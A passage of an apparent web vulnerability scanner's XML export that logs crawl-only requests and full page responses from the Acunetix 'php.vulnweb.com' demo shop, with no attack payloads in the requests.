]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:44 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5311</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="1D7E492B9B8F01880BE038B12CBC4762"><URL>http://php.vulnweb.com:80/listproducts.php?cat=3</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="1D7E492B9B8F01880BE038B12CBC4762"><![CDATA[GET /listproducts.php?cat=3 HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="1D7E492B9B8F01880BE038B12CBC4762";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="1bd395e8";
X-Request-Memo: ID="f60a60b4";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:44 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4699

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="1D7E492B9B8F01880BE038B12CBC4762"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=3</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>3</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="1D7E492B9B8F01880BE038B12CBC4762";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="1bd395e8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="f60a60b4";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:44 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4699</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="F7D951246A36A7EA95380E5645528F36"><URL>http://php.vulnweb.com:80/listproducts.php?cat=4</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="F7D951246A36A7EA95380E5645528F36"><![CDATA[GET /listproducts.php?cat=4 HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="F7D951246A36A7EA95380E5645528F36";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="8eb9d391";
X-Request-Memo: ID="f394b8a6";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:45 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4699

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="F7D951246A36A7EA95380E5645528F36"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=4</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>4</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="F7D951246A36A7EA95380E5645528F36";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="8eb9d391";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="f394b8a6";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:45 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4699</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="D0A7402B83800F606909C145FDDC0FB3"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="D0A7402B83800F606909C145FDDC0FB3"><![CDATA[GET /Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="D0A7402B83800F606909C145FDDC0FB3";PSID="6A3E6B22313623A0E6D1F5887F392849";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="1657cc8f";
X-Request-Memo: ID="c4cef0d5";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:46 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 319

<div><img src='/Mod_Rewrite_Shop/images/1.jpg'><b>Network Storage D-Link DNS-313 enclosure 1 x SATA</b><br><br>NET STORAGE ENCLOSURE SATA DNS-313 D-LINK<br><a href='/Mod_Rewrite_Shop/BuyProduct-1/'>Buy</a>&nbsp;<a href='/Mod_Rewrite_Shop/RateProduct-1.html'>Rate</a></div><hr><a href='/Mod_Rewrite_Shop/'>Back</a>
